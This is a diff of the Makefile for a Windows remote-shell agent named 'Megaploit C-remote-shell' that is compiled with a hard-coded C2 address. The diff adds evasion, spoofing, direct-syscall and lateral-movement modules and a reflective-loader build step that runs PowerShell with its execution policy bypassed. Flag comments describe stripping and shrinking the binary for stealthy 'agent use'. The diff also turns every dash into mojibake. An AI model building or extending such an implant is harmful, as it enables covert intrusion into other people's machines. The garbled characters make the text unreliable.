@@ -1,19 +1,19 @@
 # ============================================================================
-# C-remote-shell — Makefile
+# C-remote-shell â€” Makefile
 # ============================================================================
 # Builds the Megaploit C-remote-shell Windows EXE client using MSVC or MinGW.
 #
 # Targets
 # -------
-#   make              — auto-detect compiler, build client + server
-#   make client       — build the client only
-#   make server       — build the server only (serverShell.c, Windows)
-#   make clean        — remove compiled binaries
+#   make              â€” auto-detect compiler, build client + server
+#   make client       â€” build the client only
+#   make server       â€” build the server only (serverShell.c, Windows)
+#   make clean        â€” remove compiled binaries
 #
 # Compiler selection (in order of preference)
 # --------------------------------------------
-#   MSVC  — run from a "Developer Command Prompt for VS" (cl.exe in PATH)
-#   MinGW — apt install mingw-w64 on Linux/macOS  (x86_64-w64-mingw32-gcc)
+#   MSVC  â€” run from a "Developer Command Prompt for VS" (cl.exe in PATH)
+#   MinGW â€” apt install mingw-w64 on Linux/macOS  (x86_64-w64-mingw32-gcc)
 #
 # Override via:
 #   make CC=cl           (force MSVC)
@@ -62,17 +62,29 @@ NAME     ?= megaploit_c_agent
 # ---------------------------------------------------------------------------
 
 # Refactored client/ build (preferred)
-CLIENT_SRCS := client/main.c   \
-               client/ntcalls.c \
-               client/shell.c   \
-               client/inject.c  \
+CLIENT_SRCS := client/main.c             \
+               client/spoof.c            \
+               client/peb_walk.c         \
+               client/syscall.c          \
+               client/ntcalls.c          \
+               client/shell.c            \
+               client/handlers_system.c  \
+               client/handlers_ui.c      \
+               client/handlers_lateral.c \
+               client/inject.c           \
+               client/evasion.c          \
                tls/tls_client.c
+
+# Reflective loader blob (auto-generated from loader.c before main build)
+LOADER_BIN  := client/loader_func.bin
+LOADER_OBJ  := client/loader.o
+LOADER_BLOB := client/loader_blob.h
 
 # Legacy single-file build (Source.c + shared tls/tls_client.c)
 LEGACY_SRCS := Source.c tls/tls_client.c
 
 # Refactored POSIX server (server/main.c + server/server.c + server/prompt.c)
-# Compiled on Linux/macOS with native gcc — NOT with the Windows cross-compiler.
+# Compiled on Linux/macOS with native gcc â€” NOT with the Windows cross-compiler.
 SERVER_REFACTORED_SRCS := server/main.c server/server.c server/prompt.c
 
 # Legacy single-file POSIX server
@@ -82,12 +94,12 @@ SERVER_LEGACY_SRCS := serverShell.c
 # MSVC flags
 # ---------------------------------------------------------------------------
 
-# /O1        — optimise for size (smaller than /O2 for agent use)
-# /GS-       — disable stack buffer security cookies (saves ~1 KB overhead)
-# /Gy        — function-level linking (linker can dead-strip unused funcs)
-# /DNDEBUG   — strip asserts and debug strings
-# /GL        — whole-program optimisation
-# /link /OPT:REF /OPT:ICF — dead-code elimination at link time
+# /O1        â€” optimise for size (smaller than /O2 for agent use)
+# /GS-       â€” disable stack buffer security cookies (saves ~1 KB overhead)
+# /Gy        â€” function-level linking (linker can dead-strip unused funcs)
+# /DNDEBUG   â€” strip asserts and debug strings
+# /GL        â€” whole-program optimisation
+# /link /OPT:REF /OPT:ICF â€” dead-code elimination at link time
 MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
                 /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT)
 MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
@@ -97,12 +109,12 @@ MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User3
 # MinGW flags
 # ---------------------------------------------------------------------------
 
-# -Os          — optimise for size
-# -s           — strip all symbols from the output binary
-# -ffunction-sections / -fdata-sections + --gc-sections — dead code removal
-# -fno-ident   — omit GCC version string from binary
-# -fno-asynchronous-unwind-tables — strip .eh_frame / .pdata (saves ~10-15%)
-# -mwindows    — GUI subsystem: no console window, no AllocConsole needed
+# -Os          â€” optimise for size
+# -s           â€” strip all symbols from the output binary
+# -ffunction-sections / -fdata-sections + --gc-sections â€” dead code removal
+# -fno-ident   â€” omit GCC version string from binary
+# -fno-asynchronous-unwind-tables â€” strip .eh_frame / .pdata (saves ~10-15%)
+# -mwindows    â€” GUI subsystem: no console window, no AllocConsole needed
 MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
                 -ffunction-sections -fdata-sections                     \
                 -fno-ident -fno-asynchronous-unwind-tables              \
@@ -115,7 +127,7 @@ MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwin
 # ---------------------------------------------------------------------------
 
 ifeq ($(CC),$(CC_MSVC))
-  # ── MSVC ──────────────────────────────────────────────────────────────────
+  # â”€â”€ MSVC â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   CLIENT_OUT := $(NAME).exe
   LEGACY_OUT := $(NAME)_legacy.exe
   SERVER_OUT := serverShell.exe
@@ -135,14 +147,24 @@ ifeq ($(CC),$(CC_MSVC))
 	-del /F /Q *.exe *.obj *.pdb *.ilk 2>NUL
 
 else
-  # ── MinGW ─────────────────────────────────────────────────────────────────
+  # â”€â”€ MinGW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   CLIENT_OUT := $(NAME).exe
   LEGACY_OUT := $(NAME)_legacy.exe
   SERVER_OUT := serverShell.exe
 
-  client:
+  client: $(LOADER_BLOB)
 	$(CC) $(MINGW_CFLAGS) $(CLIENT_SRCS) -o $(CLIENT_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
 	@echo "[+] Client built: $(CLIENT_OUT)"
+
+  $(LOADER_OBJ): client/loader.c client/loader.h
+	$(CC) -O0 -fpic -fno-stack-protector -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident -DWIN32_LEAN_AND_MEAN -c client/loader.c -o $(LOADER_OBJ)
+
+  $(LOADER_BIN): $(LOADER_OBJ)
+	objcopy --only-section='.text$$rfl_loader' -O binary $(LOADER_OBJ) $(LOADER_BIN)
+
+  $(LOADER_BLOB): $(LOADER_BIN)
+	powershell -NoProfile -ExecutionPolicy Bypass -File client/gen_loader_blob.ps1 -BinPath "$(LOADER_BIN)" -OutPath "$(LOADER_BLOB)"
+	@echo "[+] Loader blob: $(LOADER_BLOB)"
 
   legacy:
 	$(CC) $(MINGW_CFLAGS) $(LEGACY_SRCS) -o $(LEGACY_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
@@ -153,11 +175,12 @@ else
 
   clean:
 	rm -f *.exe
+	-rm -f client/loader.o client/loader_func.bin client/loader_blob.h
 
 endif
 
 # ---------------------------------------------------------------------------
-# POSIX server targets (Linux / macOS only — use native gcc, not MinGW)
+# POSIX server targets (Linux / macOS only â€” use native gcc, not MinGW)
 # ---------------------------------------------------------------------------
 # These targets are compiler-agnostic and always use the system gcc.
 # They are intentionally NOT part of the default `all` target because they
